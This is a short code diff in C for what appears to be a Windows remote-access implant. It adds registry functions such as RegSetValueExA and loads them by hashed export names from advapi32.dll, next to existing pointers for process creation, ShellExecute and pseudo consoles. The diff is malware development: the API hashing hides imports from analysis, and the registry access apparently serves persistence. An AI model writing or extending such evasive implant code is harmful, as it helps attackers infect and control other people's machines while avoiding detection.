@@ -8,6 +8,8 @@
 */
 
 #include <process.h>
+#include <shlobj.h>
+#include <shlwapi.h>
 #include <windows.h>
 
 /* ======================================[[ API Hashing ]]====================================== */
@@ -139,11 +141,13 @@ _ShellExecuteA oShellExecuteA;
 _CreatePseudoConsole oCreatePseudoConsole;
 _ClosePseudoConsole oClosePseudoConsole;
 _CreateProcessA oCreateProcessA;
+_RegOpenKeyExA oRegOpenKeyExA;
+_RegCloseKey oRegCloseKey;
+_RegSetValueExA oRegSetValueExA;
+_RegQueryValueExA oRegQueryValueExA;
 
 /* TODO:
     GetEnvironmentVariable
-
-    windows registry related API
 */
 
 void laikaO_init()
@@ -155,11 +159,8 @@ void laikaO_init()
     oCreatePseudoConsole = (_CreatePseudoConsole)findByHash("kernel32.dll", 0x7310ef7);
     oClosePseudoConsole = (_ClosePseudoConsole)findByHash("kernel32.dll", 0xeff42590);
     oCreateProcessA = (_CreateProcessA)findByHash("kernel32.dll", 0x9e687c1d);
-
-/*
-    hash = getHashName("InitializeProcThreadAttributeList");
-    printf("InitializeProcThreadAttributeList: real is %p, hashed is %p. [HASH: %x]\n",
-           (void *)InitializeProcThreadAttributeList,
-           findByHash("kernel32.dll", hash), hash);
-*/
+    oRegOpenKeyExA = (_RegOpenKeyExA)(findByHash("advapi32.dll", 0x15041404));
+    oRegCloseKey = (_RegCloseKey)(findByHash("advapi32.dll", 0xae0cf309));
+    oRegSetValueExA = (_RegSetValueExA)(findByHash("advapi32.dll", 0xcb91dcf7));
+    oRegQueryValueExA = (_RegQueryValueExA)(findByHash("advapi32.dll", 0x4298d735));
 }
